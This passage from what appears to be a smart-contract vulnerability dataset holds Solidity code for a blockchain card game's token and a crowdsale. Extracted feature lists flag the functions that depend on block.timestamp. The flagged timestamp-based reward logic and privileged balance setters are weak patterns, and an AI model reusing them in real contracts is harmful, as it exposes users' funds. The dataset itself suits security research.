function transfer(address recipient, uint256 amount) public returns (bool) {\n updatePlayersCoin(msg.sender);\n require(amount <= jadeBalance[msg.sender]);\n jadeBalance[msg.sender] = SafeMath.sub(jadeBalance[msg.sender],amount);\n jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);\n Transfer(msg.sender, recipient, amount);\n return true;\n }\n function transferFrom(address player, address recipient, uint256 amount) public returns (bool) {\n updatePlayersCoin(player);\n require(amount <= allowed[player][msg.sender] && amount <= jadeBalance[player]);\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],amount);\n jadeBalance[recipient] = SafeMath.add(jadeBalance[recipient],amount);\n allowed[player][msg.sender] = SafeMath.sub(allowed[player][msg.sender],amount);\n Transfer(player, recipient, amount);\n return true;\n }\n function approve(address approvee, uint256 amount) public returns (bool) {\n allowed[msg.sender][approvee] = amount;\n Approval(msg.sender, approvee, amount);\n return true;\n }\n function allowance(address player, address approvee) public constant returns(uint256) {\n return allowed[player][approvee];\n }\n function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public onlyAccess {\n uint256 unclaimedJade = balanceOfUnclaimed(player);\n if (purchaseCost > unclaimedJade) {\n uint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);\n require(jadeBalance[player] >= jadeDecrease);\n roughSupply = SafeMath.sub(roughSupply,jadeDecrease);\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],jadeDecrease);\n } else {\n uint256 jadeGain = SafeMath.sub(unclaimedJade,purchaseCost);\n roughSupply = SafeMath.add(roughSupply,jadeGain);\n jadeBalance[player] = SafeMath.add(jadeBalance[player],jadeGain);\n }\n lastJadeSaveTime[player] = block.timestamp;\n }\n function JadeCoinMining(address _addr, uint256 _amount) external onlyAdmin {\n roughSupply = SafeMath.add(roughSupply,_amount);\n jadeBalance[_addr] = SafeMath.add(jadeBalance[_addr],_amount);\n }\n function setRoughSupply(uint256 iroughSupply) external onlyAccess {\n roughSupply = SafeMath.add(roughSupply,iroughSupply);\n }\n function coinBalanceOf(address player,uint8 itype) external constant returns(uint256) {\n return coinBalance[player][itype];\n }\n function setJadeCoin(address player, uint256 coin, bool iflag) external onlyAccess {\n if (iflag) {\n jadeBalance[player] = SafeMath.add(jadeBalance[player],coin);\n } else if (!iflag) {\n jadeBalance[player] = SafeMath.sub(jadeBalance[player],coin);\n }\n }\n function setCoinBalance(address player, uint256 eth, uint8 itype, bool iflag) external onlyAccess {\n if (iflag) {\n coinBalance[player][itype] = SafeMath.add(coinBalance[player][itype],eth);\n } else if (!iflag) {\n coinBalance[player][itype] = SafeMath.sub(coinBalance[player][itype],eth);\n }\n }\n function setLastJadeSaveTime(address player) external onlyAccess {\n lastJadeSaveTime[player] = block.timestamp;\n }\n function setTotalEtherPool(uint256 inEth, uint8 itype, bool iflag) external onlyAccess {\n if (iflag) {\n totalEtherPool[itype] = SafeMath.add(totalEtherPool[itype],inEth);\n } else if (!iflag) {\n totalEtherPool[itype] = SafeMath.sub(totalEtherPool[itype],inEth);\n }\n }\n function getTotalEtherPool(uint8 itype) external view returns (uint256) {\n return totalEtherPool[itype];\n }\n function setJadeCoinZero(address player) external onlyAccess {\n jadeBalance[player]=0;\n }\n function getNextSnapshotTime() external view returns(uint256) {\n return nextSnapshotTime;\n }\n function viewUnclaimedResearchDividends() external constant returns (uint256, uint256, uint256) {\n uint256 startSnapshot = lastJadeResearchFundClaim[msg.sender];\n uint256 latestSnapshot = allocatedJadeResearchSnapshots.length - 1;\n uint256 researchShare;\n uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];\n for (uint256 i = startSnapshot; i <= latestSnapshot; i++) {\n uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];\n bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];\n if (productionDuringSnapshot == 0 && !soldAllProduction) {\n productionDuringSnapshot = previousProduction;\n } else {\n previousProduction = productionDuringSnapshot;\n }\n researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];\n }\n return (researchShare, startSnapshot, latestSnapshot);\n }\n function claimResearchDividends(address referer, uint256 startSnapshot, uint256 endSnapShot) external {\n require(startSnapshot <= endSnapShot);\n require(startSnapshot >= lastJadeResearchFundClaim[msg.sender]);\n require(endSnapShot < allocatedJadeResearchSnapshots.length);\n uint256 researchShare;\n uint256 previousProduction = jadeProductionSnapshots[msg.sender][lastJadeResearchFundClaim[msg.sender] - 1];\n for (uint256 i = startSnapshot; i <= endSnapShot; i++) {\n uint256 productionDuringSnapshot = jadeProductionSnapshots[msg.sender][i];\n bool soldAllProduction = jadeProductionZeroedSnapshots[msg.sender][i];\n if (productionDuringSnapshot == 0 && !soldAllProduction) {\n productionDuringSnapshot = previousProduction;\n } else {\n previousProduction = productionDuringSnapshot;\n }\n researchShare += (allocatedJadeResearchSnapshots[i] * productionDuringSnapshot) / totalJadeProductionSnapshots[i];\n }\n if (jadeProductionSnapshots[msg.sender][endSnapShot] == 0 && !jadeProductionZeroedSnapshots[msg.sender][endSnapShot] && previousProduction > 0) {\n jadeProductionSnapshots[msg.sender][endSnapShot] = previousProduction;\n }\n lastJadeResearchFundClaim[msg.sender] = endSnapShot + 1;\n uint256 referalDivs;\n if (referer != address(0) && referer != msg.sender) {\n referalDivs = researchShare / 100;\n coinBalance[referer][1] += referalDivs;\n ReferalGain(referer, msg.sender, referalDivs);\n }\n coinBalance[msg.sender][1] += SafeMath.sub(researchShare,referalDivs);\n }\n function snapshotDailyGooResearchFunding() external onlyAdmin {\n uint256 todaysGooResearchFund = (totalEtherPool[1] * researchDivPercent) / 100;\n totalEtherPool[1] -= todaysGooResearchFund;\n totalJadeProductionSnapshots.push(totalJadeProduction);\n allocatedJadeResearchSnapshots.push(todaysGooResearchFund);\n nextSnapshotTime = block.timestamp + 24 hours;\n }\n}\ninterface GameConfigInterface {\n function productionCardIdRange() external constant returns (uint256, uint256);\n function battleCardIdRange() external constant returns (uint256, uint256);\n function upgradeIdRange() external constant returns (uint256, uint256);\n function unitCoinProduction(uint256 cardId) external constant returns (uint256);\n function unitAttack(uint256 cardId) external constant returns (uint256);\n function unitDefense(uint256 cardId) external constant returns (uint256);\n function unitStealingCapacity(uint256 cardId) external constant returns (uint256);\n}\ncontract CardsBase is JadeCoin {\n function CardsBase() public {\n setAdminContract(msg.sender,true);\n setActionContract(msg.sender,true);\n }\n struct Player {\n address owneraddress;\n }\n Player[] players;\n bool gameStarted;\n GameConfigInterface public schema;\n mapping(address => mapping(uint256 => uint256)) public unitsOwned;\n mapping(address => mapping(uint256 => uint256)) public upgradesOwned;\n mapping(address => uint256) public uintsOwnerCount;\n mapping(address=> mapping(uint256 => uint256)) public uintProduction;\n mapping(address => mapping(uint256 => uint256)) public unitCoinProductionIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitCoinProductionMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitAttackIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitAttackMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitDefenseIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitDefenseMultiplier;\n mapping(address => mapping(uint256 => uint256)) public unitJadeStealingIncreases;\n mapping(address => mapping(uint256 => uint256)) public unitJadeStealingMultiplier;\n mapping(address => mapping(uint256 => uint256)) private unitMaxCap;\n function setConfigAddress(address _address) external onlyOwner {\n schema = GameConfigInterface(_address);\n }\n function beginGame(uint256 firstDivsTime) external payable onlyOwner {\n require(!gameStarted);\n gameStarted = true;\n nextSnapshotTime = firstDivsTime;\n totalEtherPool[1] = msg.value;\n }\n function endGame() external payable onlyOwner {\n require(gameStarted);\n gameStarted = false;\n }\n function getGameStarted() external constant returns (bool) {\n return gameStarted;\n }\n function AddPlayers(address _address) external onlyAccess {\n Player memory _player= Player({\n owneraddress: _address\n });\n players.push(_player);\n }\n function getRanking() external view returns (address[], uint256[],uint256[]) {\n uint256 len = players.length;\n uint256[] memory arr = new uint256[](len);\n address[] memory arr_addr = new address[](len);\n uint256[] memory arr_def = new uint256[](len);\n uint counter =0;\n for (uint k=0;k<len; k++){\n arr[counter] = getJadeProduction(players[k].owneraddress);\n arr_addr[counter] = players[k].owneraddress;\n (,arr_def[counter],,) = getPlayersBattleStats(players[k].owneraddress);\n counter++;\n }\n for(uint i=0;i<len-1;i++) {\n for(uint j=0;j<len-i-1;j++) {\n if(arr[j]<arr[j+1]) {\n uint256 temp = arr[j];\n address temp_addr = arr_addr[j];\n uint256 temp_def = arr_def[j];\n arr[j] = arr[j+1];\n arr[j+1] = temp;\n arr_addr[j] = arr_addr[j+1];\n arr_addr[j+1] = temp_addr;\n arr_def[j] = arr_def[j+1];\n arr_def[j+1] = temp_def;\n }\n }\n }\n return (arr_addr,arr,arr_def);\n }\n function getTotalUsers() external view returns (uint256) {\n return players.length;\n }\n function getMaxCap(address _addr,uint256 _cardId) external view returns (uint256) {\n return unitMaxCap[_addr][_cardId];\n }\n function getUnitsProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {\n return (amount * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]) * (10 + unitCoinProductionMultiplier[player][unitId])) / 10;\n }\n function getUnitsInProduction(address player, uint256 unitId, uint256 amount) external constant returns (uint256) {\n return SafeMath.div(SafeMath.mul(amount,uintProduction[player][unitId]),unitsOwned[player][unitId]);\n }\n function getUnitsAttack(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitAttack(unitId) + unitAttackIncreases[player][unitId]) * (10 + unitAttackMultiplier[player][unitId])) / 10;\n }\n function getUnitsDefense(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitDefense(unitId) + unitDefenseIncreases[player][unitId]) * (10 + unitDefenseMultiplier[player][unitId])) / 10;\n }\n function getUnitsStealingCapacity(address player, uint256 unitId, uint256 amount) internal constant returns (uint256) {\n return (amount * (schema.unitStealingCapacity(unitId) + unitJadeStealingIncreases[player][unitId]) * (10 + unitJadeStealingMultiplier[player][unitId])) / 10;\n }\n function getPlayersBattleStats(address player) public constant returns (\n uint256 attackingPower,\n uint256 defendingPower,\n uint256 stealingPower,\n uint256 battlePower) {\n uint256 startId;\n uint256 endId;\n (startId, endId) = schema.battleCardIdRange();\n while (startId <= endId) {\n attackingPower = SafeMath.add(attackingPower,getUnitsAttack(player, startId, unitsOwned[player][startId]));\n stealingPower = SafeMath.add(stealingPower,getUnitsStealingCapacity(player, startId, unitsOwned[player][startId]));\n defendingPower = SafeMath.add(defendingPower,getUnitsDefense(player, startId, unitsOwned[player][startId]));\n battlePower = SafeMath.add(attackingPower,defendingPower);\n startId++;\n }\n }\n function getOwnedCount(address player, uint256 cardId) external view returns (uint256) {\n return unitsOwned[player][cardId];\n }\n function setOwnedCount(address player, uint256 cardId, uint256 amount, bool iflag) external onlyAccess {\n if (iflag) {\n unitsOwned[player][cardId] = SafeMath.add(unitsOwned[player][cardId],amount);\n } else if (!iflag) {\n unitsOwned[player][cardId] = SafeMath.sub(unitsOwned[player][cardId],amount);\n }\n }\n function getUpgradesOwned(address player, uint256 upgradeId) external view returns (uint256) {\n return upgradesOwned[player][upgradeId];\n }\n function setUpgradesOwned(address player, uint256 upgradeId) external onlyAccess {\n upgradesOwned[player][upgradeId] = SafeMath.add(upgradesOwned[player][upgradeId],1);\n }\n function getUintsOwnerCount(address _address) external view returns (uint256) {\n return uintsOwnerCount[_address];\n }\n function setUintsOwnerCount(address _address, uint256 amount, bool iflag) external onlyAccess {\n if (iflag) {\n uintsOwnerCount[_address] = SafeMath.add(uintsOwnerCount[_address],amount);\n } else if (!iflag) {\n uintsOwnerCount[_address] = SafeMath.sub(uintsOwnerCount[_address],amount);\n }\n }\n function getUnitCoinProductionIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitCoinProductionIncreases[_address][cardId];\n }\n function setUnitCoinProductionIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitCoinProductionIncreases[_address][cardId] = SafeMath.add(unitCoinProductionIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitCoinProductionIncreases[_address][cardId] = SafeMath.sub(unitCoinProductionIncreases[_address][cardId],iValue);\n }\n }\n function getUnitCoinProductionMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitCoinProductionMultiplier[_address][cardId];\n }\n function setUnitCoinProductionMultiplier(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {\n if (iflag) {\n unitCoinProductionMultiplier[_address][cardId] = SafeMath.add(unitCoinProductionMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitCoinProductionMultiplier[_address][cardId] = SafeMath.sub(unitCoinProductionMultiplier[_address][cardId],iValue);\n }\n }\n function setUnitAttackIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitAttackIncreases[_address][cardId] = SafeMath.add(unitAttackIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitAttackIncreases[_address][cardId] = SafeMath.sub(unitAttackIncreases[_address][cardId],iValue);\n }\n }\n function getUnitAttackIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitAttackIncreases[_address][cardId];\n }\n function setUnitAttackMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitAttackMultiplier[_address][cardId] = SafeMath.add(unitAttackMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitAttackMultiplier[_address][cardId] = SafeMath.sub(unitAttackMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitAttackMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitAttackMultiplier[_address][cardId];\n }\n function setUnitDefenseIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitDefenseIncreases[_address][cardId] = SafeMath.add(unitDefenseIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitDefenseIncreases[_address][cardId] = SafeMath.sub(unitDefenseIncreases[_address][cardId],iValue);\n }\n }\n function getUnitDefenseIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitDefenseIncreases[_address][cardId];\n }\n function setunitDefenseMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitDefenseMultiplier[_address][cardId] = SafeMath.add(unitDefenseMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitDefenseMultiplier[_address][cardId] = SafeMath.sub(unitDefenseMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitDefenseMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitDefenseMultiplier[_address][cardId];\n }\n function setUnitJadeStealingIncreases(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitJadeStealingIncreases[_address][cardId] = SafeMath.add(unitJadeStealingIncreases[_address][cardId],iValue);\n } else if (!iflag) {\n unitJadeStealingIncreases[_address][cardId] = SafeMath.sub(unitJadeStealingIncreases[_address][cardId],iValue);\n }\n }\n function getUnitJadeStealingIncreases(address _address, uint256 cardId) external view returns (uint256) {\n return unitJadeStealingIncreases[_address][cardId];\n }\n function setUnitJadeStealingMultiplier(address _address, uint256 cardId, uint256 iValue,bool iflag) external onlyAccess {\n if (iflag) {\n unitJadeStealingMultiplier[_address][cardId] = SafeMath.add(unitJadeStealingMultiplier[_address][cardId],iValue);\n } else if (!iflag) {\n unitJadeStealingMultiplier[_address][cardId] = SafeMath.sub(unitJadeStealingMultiplier[_address][cardId],iValue);\n }\n }\n function getUnitJadeStealingMultiplier(address _address, uint256 cardId) external view returns (uint256) {\n return unitJadeStealingMultiplier[_address][cardId];\n }\n function setUintCoinProduction(address _address, uint256 cardId, uint256 iValue, bool iflag) external onlyAccess {\n if (iflag) {\n uintProduction[_address][cardId] = SafeMath.add(uintProduction[_address][cardId],iValue);\n } else if (!iflag) {\n uintProduction[_address][cardId] = SafeMath.sub(uintProduction[_address][cardId],iValue);\n }\n }\n function getUintCoinProduction(address _address, uint256 cardId) external view returns (uint256) {\n return uintProduction[_address][cardId];\n }\n function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {\n uint256 productionGain;\n if (upgradeClass == 0) {\n unitCoinProductionIncreases[player][unitId] += upgradeValue;\n productionGain = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);\n increasePlayersJadeProduction(player, productionGain);\n } else if (upgradeClass == 1) {\n unitCoinProductionMultiplier[player][unitId] += upgradeValue;\n productionGain = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);\n increasePlayersJadeProduction(player, productionGain);\n } else if (upgradeClass == 2) {\n unitAttackIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 3) {\n unitAttackMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 4) {\n unitDefenseIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 5) {\n unitDefenseMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 6) {\n unitJadeStealingIncreases[player][unitId] += upgradeValue;\n } else if (upgradeClass == 7) {\n unitJadeStealingMultiplier[player][unitId] += upgradeValue;\n } else if (upgradeClass == 8) {\n unitMaxCap[player][unitId] = upgradeValue;\n }\n }\n function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external onlyAccess {\n uint256 productionLoss;\n if (upgradeClass == 0) {\n unitCoinProductionIncreases[player][unitId] -= upgradeValue;\n productionLoss = unitsOwned[player][unitId] * upgradeValue * (10 + unitCoinProductionMultiplier[player][unitId]);\n reducePlayersJadeProduction(player, productionLoss);\n } else if (upgradeClass == 1) {\n unitCoinProductionMultiplier[player][unitId] -= upgradeValue;\n productionLoss = unitsOwned[player][unitId] * upgradeValue * (schema.unitCoinProduction(unitId) + unitCoinProductionIncreases[player][unitId]);\n reducePlayersJadeProduction(player, productionLoss);\n } else if (upgradeClass == 2) {\n unitAttackIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 3) {\n unitAttackMultiplier[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 4) {\n unitDefenseIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 5) {\n unitDefenseMultiplier[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 6) {\n unitJadeStealingIncreases[player][unitId] -= upgradeValue;\n } else if (upgradeClass == 7) {\n unitJadeStealingMultiplier[player][unitId] -= upgradeValue;\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function balanceOfUnclaimed(address player) public constant returns (uint256) {\nuint256 lSave = lastJadeSaveTime[player];\nif (lSave > 0 && lSave < block.timestamp) {\nreturn SafeMath.mul(getJadeProduction(player),SafeMath.div(SafeMath.sub(block.timestamp,lSave),10));\n}\nreturn 0;\n}",
    "function updatePlayersCoin(address player) internal {\nuint256 coinGain = balanceOfUnclaimed(player);\nlastJadeSaveTime[player] = block.timestamp;\nroughSupply = SafeMath.add(roughSupply,coinGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n}",
    "function updatePlayersCoinByOut(address player) external onlyAccess {\nuint256 coinGain = balanceOfUnclaimed(player);\nlastJadeSaveTime[player] = block.timestamp;\nroughSupply = SafeMath.add(roughSupply,coinGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],coinGain);\n}",
    "function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public onlyAccess {\nuint256 unclaimedJade = balanceOfUnclaimed(player);\nif (purchaseCost > unclaimedJade) {\nuint256 jadeDecrease = SafeMath.sub(purchaseCost, unclaimedJade);\nrequire(jadeBalance[player] >= jadeDecrease);\nroughSupply = SafeMath.sub(roughSupply,jadeDecrease);\njadeBalance[player] = SafeMath.sub(jadeBalance[player],jadeDecrease);\n} else {\nuint256 jadeGain = SafeMath.sub(unclaimedJade,purchaseCost);\nroughSupply = SafeMath.add(roughSupply,jadeGain);\njadeBalance[player] = SafeMath.add(jadeBalance[player],jadeGain);\n}\nlastJadeSaveTime[player] = block.timestamp;\n}",
    "function setLastJadeSaveTime(address player) external onlyAccess {\nlastJadeSaveTime[player] = block.timestamp;\n}",
    "function snapshotDailyGooResearchFunding() external onlyAdmin {\nuint256 todaysGooResearchFund = (totalEtherPool[1] * researchDivPercent) / 100;\ntotalEtherPool[1] -= todaysGooResearchFund;\ntotalJadeProductionSnapshots.push(totalJadeProduction);\nallocatedJadeResearchSnapshots.push(todaysGooResearchFund);\nnextSnapshotTime = block.timestamp + 24 hours;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f0c"
  },
  "filename": "6297.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract JcnxxxToken is MintableToken {\n string public name = \"JCN Token\";\n string public symbol = \"JCNXXX\";\n uint8 public decimals = 18;\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract MintedCrowdsale is Crowdsale {\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n require(MintableToken(token).mint(_beneficiary, _tokenAmount));\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract JcnxxxCrowdsale is FinalizableCrowdsale, MintedCrowdsale, CappedCrowdsale {\n uint256 public constant FOUNDERS_SHARE = 30000000 * (10 ** uint256(18));\n uint256 public constant RESERVE_FUND = 15000000 * (10 ** uint256(18));\n uint256 public constant CONTENT_FUND = 5000000 * (10 ** uint256(18));\n uint256 public constant BOUNTY_FUND = 5000000 * (10 ** uint256(18));\n uint256 public constant HARD_CAP = 100000000 * (10 ** uint256(18));\n enum IcoPhases { PrivateSale, EarlyBirdPresale, Presale, EarlyBirdCrowdsale, FullCrowdsale }\n struct Phase {\n uint256 startTime;\n uint256 endTime;\n uint256 minimum;\n uint8 bonus;\n }\n mapping (uint => Phase) ico;\n function JcnxxxCrowdsale(uint256 _openingTime, uint256 _closingTime, uint256 _rate, address _wallet, MintableToken _token) public\n CappedCrowdsale(HARD_CAP.div(_rate))\n FinalizableCrowdsale()\n MintedCrowdsale()\n TimedCrowdsale(_openingTime, _closingTime)\n Crowdsale(_rate, _wallet, _token)\n {\n ico[uint(IcoPhases.PrivateSale)] = Phase(1531126800, 1537001999, 10000000000000000000, 50);\n ico[uint(IcoPhases.EarlyBirdPresale)] = Phase(1537002000, 1537865999, 750000000000000000, 25);\n ico[uint(IcoPhases.Presale)] = Phase(1537866000, 1538729999, 500000000000000000, 15);\n ico[uint(IcoPhases.EarlyBirdCrowdsale)] = Phase(1538730000, 1539593999, 250000000000000000, 5);\n 